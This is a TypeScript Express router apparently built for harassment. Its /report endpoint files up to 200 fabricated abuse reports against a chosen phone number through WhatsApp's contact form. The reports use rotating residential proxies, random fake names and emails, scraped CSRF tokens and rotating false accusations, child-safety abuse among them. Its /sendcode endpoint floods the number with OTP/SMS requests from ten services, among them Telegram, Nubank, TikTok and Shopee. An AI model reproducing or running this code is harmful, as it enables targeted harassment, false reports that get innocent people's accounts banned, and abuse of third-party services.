import { Router }   from "express";
import { spawn }    from "child_process";
import * as fs      from "fs";
import { proxyCache, getResidentialCreds } from "./proxies.js";

const router = Router();

// ── In-memory report history (últimas 200 operações) ─────────────────────────
interface HistoryEntry {
  type:    "report" | "sendcode";
  number:  string;
  sent:    number;
  total:   number;
  at:      number;
  userId?: string;
}
const operationHistory: HistoryEntry[] = [];
function pushHistory(e: HistoryEntry) {
  operationHistory.push(e);
  if (operationHistory.length > 200) operationHistory.shift();
}

// ── GET /history ──────────────────────────────────────────────────────────────
router.get("/history", (_req, res) => {
  res.json({ count: operationHistory.length, entries: operationHistory.slice().reverse() });
});

// ── Proxy picker — rotates across all residential/authenticated proxies ───────
function pickProxyArgs(): string[] {
  const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
  const seen = new Set<string>();
  const unique = authPool.filter(p => {
    const k = `${p.host}:${p.port}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
  if (unique.length > 0) {
    const pick = unique[Math.floor(Math.random() * unique.length)]!;
    return ["-x", `http://${pick.username}:${pick.password}@${pick.host}:${pick.port}`];
  }
  const c = getResidentialCreds();
  if (c) return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
  return [];
}

// ── curl helper ───────────────────────────────────────────────────────────────
interface CurlResult { statusCode: number; body: string }

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  return new Promise((resolve, reject) => {
    const child = spawn("curl", [
      "--silent", "--show-error", "--max-time", String(Math.ceil(timeoutMs / 1000)),
      "--write-out", "\n---STATUS:%{http_code}---",
      "--compressed", "-L",
      ...argv,
    ]);
    let out = "";
    let err = "";
    child.stdout.on("data", (d: Buffer) => { out += d.toString(); });
    child.stderr.on("data", (d: Buffer) => { err += d.toString(); });
    const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("CURL_28:TIMEOUT")); }, timeoutMs + 2000);
    child.on("close", () => {
      clearTimeout(timer);
      const sep = out.lastIndexOf("---STATUS:");
      const body = sep >= 0 ? out.slice(0, sep).trimEnd() : out.trimEnd();
      const code = sep >= 0 ? parseInt(out.slice(sep + 10).replace("---", ""), 10) : 0;
      resolve({ statusCode: isNaN(code) ? 0 : code, body });
    });
    child.on("error", (e) => { clearTimeout(timer); reject(e); });
  });
}

// ── Number normaliser ─────────────────────────────────────────────────────────
function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string; ddd: string; local: string } | null {
  const digits = raw.replace(/\D/g, "");
  let full = digits;
  if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
  if (full.length < 10 || full.length > 15) return null;
  const cc = full.startsWith("55") ? "55" : full.slice(0, 2);
  const subscriber = full.slice(cc.length);
  const ddd = subscriber.slice(0, 2);
  const local = subscriber.slice(2);
  return { e164: `+${full}`, cc, subscriber, ddd, local };
}

// ── Rotating abuse reasons ────────────────────────────────────────────────────
const REASONS = [
  { subject: "spam",          category: "spam_unwanted",            content: "Este número está enviando spam e mensagens não solicitadas repetidamente.",             _subject: "Denúncia de Spam" },
  { subject: "harassment",    category: "harassment",               content: "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",             _subject: "Denúncia de Assédio" },
  { subject: "fraud",         category: "fraud_scam",               content: "Este número está praticando fraude e golpes financeiros via WhatsApp.",                 _subject: "Denúncia de Golpe/Fraude" },
  { subject: "impersonation", category: "impersonation",            content: "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",        _subject: "Denúncia de Falsidade Ideológica" },
  { subject: "hate_speech",   category: "hate_speech_discrimination", content: "Este número está disseminando discurso de ódio e mensagens discriminatórias.",       _subject: "Denúncia de Discurso de Ódio" },
  { subject: "violence",      category: "violence_threat",          content: "Este número está fazendo ameaças de violência física a outras pessoas.",                _subject: "Denúncia de Ameaça de Violência" },
  { subject: "misinformation",category: "misinformation",           content: "Este número está espalhando desinformação e notícias falsas perigosas.",                _subject: "Denúncia de Desinformação" },
  { subject: "child_safety",  category: "child_safety",             content: "Este número está compartilhando conteúdo inapropriado envolvendo menores.",             _subject: "Denúncia de Segurança Infantil" },
] as const;

const NAMES = [
  "Carlos Silva","Ana Oliveira","João Santos","Maria Costa",
  "Pedro Almeida","Juliana Pereira","Lucas Souza","Fernanda Lima",
  "Rafael Martins","Camila Rodrigues","Bruno Ferreira","Larissa Nascimento",
];
function randName(): string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
function randEmail(): string {
  const user = `${Math.random().toString(36).slice(2, 9)}${Math.floor(Math.random() * 999)}`;
  const domains = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br"];
  return `${user}@${domains[Math.floor(Math.random() * domains.length)]}`;
}

function computeJazoest(dtsg: string): string {
  let sum = 0;
  for (const c of dtsg) sum += c.charCodeAt(0);
  return `2${sum}`;
}

// ── Single report worker (with retry) ────────────────────────────────────────
async function sendOneReport(e164: string, index: number, maxRetries = 3): Promise<{ ok: boolean; detail?: string }> {
  const reason = REASONS[index % REASONS.length]!;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const proxy  = pickProxyArgs();
    const ckFile = `/tmp/wa_rep_${process.pid}_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

    try {
      const pageRes = await runCurl([
        ...proxy,
        "--tlsv1.2",
        "-c", ckFile,
        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-Fetch-Site: none",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Upgrade-Insecure-Requests: 1",
        "https://www.whatsapp.com/contact/?subject=Abuse",
      ], 15_000);

      const dtsgMatch = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
      const dtsg = dtsgMatch?.[1] ?? "";

      if (!dtsg) {
        // No DTSG token — retry with fresh proxy
        try { fs.unlinkSync(ckFile); } catch { /**/ }
        continue;
      }

      const jazoest = computeJazoest(dtsg);
      const lsdMatch = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
      const lsd = lsdMatch?.[1] ?? dtsg;
      const wacsrfMatch = pageRes.body.match(/wa_csrf[^=\n]*?\t([A-Za-z0-9_\-]+)/);
      const waCsrfBody = wacsrfMatch?.[1] ?? "";

      const formBody = new URLSearchParams({
        fb_dtsg:      dtsg,
        jazoest,
        lsd,
        subject:      reason.subject,
        phone_number: e164,
        email:        randEmail(),
        name:         randName(),
        content:      reason.content,
        category:     reason.category,
        _subject:     reason._subject,
        ...(waCsrfBody ? { wa_csrf_token: waCsrfBody } : {}),
      }).toString();

      const postRes = await runCurl([
        ...proxy,
        "--tlsv1.2",
        "-X", "POST",
        "-b", ckFile,
        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://www.whatsapp.com",
        "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
        "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Dest: document",
        "--data-raw", formBody,
        "https://www.whatsapp.com/contact/",
      ], 15_000);

      if (postRes.statusCode === 200 || postRes.statusCode === 302) {
        return { ok: true, detail: reason.category };
      }
      // Non-success status — retry
      try { fs.unlinkSync(ckFile); } catch { /**/ }
      if (attempt < maxRetries - 1) continue;
      return { ok: false, detail: `http_${postRes.statusCode}` };

    } catch (e) {
      try { fs.unlinkSync(ckFile); } catch { /**/ }
      if (attempt < maxRetries - 1) continue;
      return { ok: false, detail: String(e).slice(0, 50) };
    } finally {
      try { fs.unlinkSync(ckFile); } catch { /**/ }
    }
  }

  return { ok: false, detail: "max_retries" };
}

// ── POST /report ──────────────────────────────────────────────────────────────
router.post("/report", async (req, res): Promise<void> => {
  const { number, quantity, userId } = req.body as { number?: string; quantity?: number | string; userId?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
  const CONCURRENCY = Math.min(qty, 10);

  const indices = Array.from({ length: qty }, (_, i) => i);
  const errors: string[] = [];
  let sent = 0;

  for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
    const slice = indices.slice(batch, batch + CONCURRENCY);
    const results = await Promise.allSettled(
      slice.map(idx => sendOneReport(num.e164, idx, 3))
    );
    for (const r of results) {
      if (r.status === "fulfilled") {
        if (r.value.ok) { sent++; }
        else { errors.push(r.value.detail ?? "unknown"); }
      } else {
        errors.push(String(r.reason).slice(0, 50));
      }
    }
  }

  pushHistory({ type: "report", number: num.e164, sent, total: qty, at: Date.now(), userId });

  res.json({
    number:    num.e164,
    requested: qty,
    sent,
    failed:    qty - sent,
    errors:    errors.length ? errors.slice(0, 20) : undefined,
  });
});

// ── POST /sendcode — disparo de OTP via múltiplos serviços ────────────────────
router.post("/sendcode", async (req, res): Promise<void> => {
  const { number, userId } = req.body as { number?: string; userId?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  type ServiceResult = { service: string; status: "sent" | "failed"; detail?: string };
  const results: ServiceResult[] = [];
  const push = (service: string, ok: boolean, detail?: string) =>
    results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });

  // Helper: tenta múltiplos endpoints para o mesmo serviço
  async function tryEndpoints(
    service: string,
    endpoints: Array<() => Promise<CurlResult>>,
    isOk: (r: CurlResult) => boolean
  ): Promise<void> {
    for (const fn of endpoints) {
      try {
        const r = await fn();
        if (isOk(r)) { push(service, true); return; }
      } catch { /* continue */ }
    }
    push(service, false, "all_endpoints_failed");
  }

  await Promise.allSettled([

    // ── 1. Telegram — envia código para o app ou via SMS ──────────────────
    runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "-H", "X-Requested-With: XMLHttpRequest",
      "-H", "Origin: https://my.telegram.org",
      "-H", "Referer: https://my.telegram.org/auth",
      "--data", `phone=${encodeURIComponent(num.e164)}`,
      "https://my.telegram.org/auth/send_password",
    ], 12_000).then(r => push("Telegram", r.body.includes("random_hash"),
      r.body.includes("random_hash") ? undefined : r.body.slice(0, 80)))
      .catch(e => push("Telegram", false, String(e).slice(0, 60))),

    // ── 2. iFood ──────────────────────────────────────────────────────────
    tryEndpoints("iFood", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: iFood/25.1.4 Android",
        "-H", "platform: android", "-H", "version: 25.1.4",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://marketplace.ifood.com.br/v2/identity/sendCode",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: iFood/25.1.4 Android",
        "-H", "platform: android",
        "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }),
        "https://marketplace.ifood.com.br/v3/identity/request-code",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 3. Rappi ──────────────────────────────────────────────────────────
    tryEndpoints("Rappi", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Rappi/14.5 Android",
        "-H", "x-country-code: BR",
        "--data-raw", JSON.stringify({ cellphone: num.subscriber, country_code: num.cc, type: "sms" }),
        "https://services.rappi.com.br/api/ms/auth/v2/phone-verification/send-code",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Rappi/14.5 Android",
        "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }),
        "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 4. PicPay ─────────────────────────────────────────────────────────
    tryEndpoints("PicPay", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: PicPay/23.0 Android",
        "-H", "x-picpay-client: android",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://api.picpay.com/v2/accounts/phone",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: PicPay/23.0 Android",
        "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }),
        "https://api.picpay.com/v1/user/phone",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 5. Mercado Livre ──────────────────────────────────────────────────
    tryEndpoints("MercadoLivre", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: MELI-Android/9.70.0",
        "-H", "x-platform: mobile",
        "--data-raw", JSON.stringify({ phone: num.e164, site_id: "MLB" }),
        "https://api.mercadolibre.com/users/registrations/phone-verification/send-code",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: MELI-Android/9.70.0",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 6. Shopee ─────────────────────────────────────────────────────────
    tryEndpoints("Shopee", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Shopee/3.26 Android",
        "-H", "X-Shopee-Language: pt-BR",
        "-H", "referer: https://shopee.com.br/user/signup",
        "--data-raw", JSON.stringify({ phone: `+${num.cc}${num.subscriber}`, support_type: [1], version: 2 }),
        "https://shopee.com.br/api/v4/user/register/phone_verify",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Shopee/3.26 Android",
        "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
        "https://shopee.com.br/api/v4/user/login/send_phoneotp",
      ], 12_000),
    ], r => r.statusCode === 200 && (
      r.body.includes('"error":0') || r.body.includes('"code":0') || r.body.includes('"status":0')
    )),

    // ── 7. TikTok ─────────────────────────────────────────────────────────
    tryEndpoints("TikTok", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST",
        "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001; Cronet/112.0.5615.136)",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept-Language: pt-BR",
        "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`,
        "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/auth/sms_send/?os_api=29&device_type=Pixel7&build_number=36.1.3",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST",
        "-H", "User-Agent: TikTok/36.1.3 Android",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data-raw", `mobile=${encodeURIComponent(num.e164)}&type=0&aid=1233`,
        "https://api22-normal-c-useast2a.tiktokv.com/aweme/v1/auth/sms_send/",
      ], 12_000),
    ], r => r.statusCode === 200 &&
      (r.body.includes('"status_code":0') || r.body.includes('"success_sms"'))),

    // ── 8. Nubank ─────────────────────────────────────────────────────────
    (async () => {
      try {
        const disc = await runCurl([
          ...pickProxyArgs(),
          "-H", "User-Agent: nubank-android-12.0",
          "-H", "Accept: application/json",
          "https://prod-global-auth.nubank.com.br/api/discovery",
        ], 10_000);
        // Handle empty or non-JSON response
        const bodyTrimmed = (disc.body ?? "").trim();
        if (!bodyTrimmed || !bodyTrimmed.startsWith("{")) {
          // Try direct SMS endpoint
          const r = await runCurl([
            ...pickProxyArgs(),
            "-X", "POST",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: nubank-android-12.0",
            "--data-raw", JSON.stringify({ phone: num.e164 }),
            "https://prod-s0-corona.nubank.com.br/api/login",
          ], 10_000);
          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `fallback_${r.statusCode}`);
          return;
        }
        let discoveryData: Record<string, string> = {};
        try { discoveryData = JSON.parse(bodyTrimmed); } catch { push("Nubank", false, "json_parse_error"); return; }
        const smsUrl = discoveryData["send_sms_challenge"] ?? discoveryData["request_code"] ??
          discoveryData["gen_certificate"] ?? "";
        if (smsUrl) {
          const r = await runCurl([
            ...pickProxyArgs(), "-X", "POST",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: nubank-android-12.0",
            "--data-raw", JSON.stringify({ phone_number: num.e164 }),
            smsUrl,
          ], 12_000);
          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `http_${r.statusCode}`);
        } else {
          push("Nubank", false, "no_sms_url");
        }
      } catch (e) {
        push("Nubank", false, String(e).slice(0, 60));
      }
    })(),

    // ── 9. Zé Delivery ────────────────────────────────────────────────────
    tryEndpoints("ZeDelivery", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: ZeDelivery/10.0 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api.ze.delivery/public-api/v3/identification/send-sms",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: ZeDelivery/10.0 Android",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api.ze.delivery/public-api/v2/identification/send-sms",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300) &&
      !r.body.toLowerCase().includes("incapsula") &&
      !r.body.toLowerCase().includes("not found")),

    // ── 10. 99Food (DiDi) ─────────────────────────────────────────────────
    tryEndpoints("99Food", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: 99food/3.0 Android",
        "-H", "Accept: application/json",
        "-H", "X-App-Platform: android",
        "--data-raw", JSON.stringify({ phone: num.e164, country_code: `+${num.cc}` }),
        "https://api-br.99app.com/v1/passenger/phone/register",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: 99food/3.0 Android",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api-br.99app.com/v2/phone/send-otp",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

  ]);

  const sent  = results.filter(r => r.status === "sent").length;
  const failed = results.filter(r => r.status === "failed").length;

  pushHistory({ type: "sendcode", number: num.e164, sent, total: results.length, at: Date.now(), userId });

  res.json({
    number:   num.e164,
    sent,
    failed,
    total:    results.length,
    services: results,
  });
});

export default router;
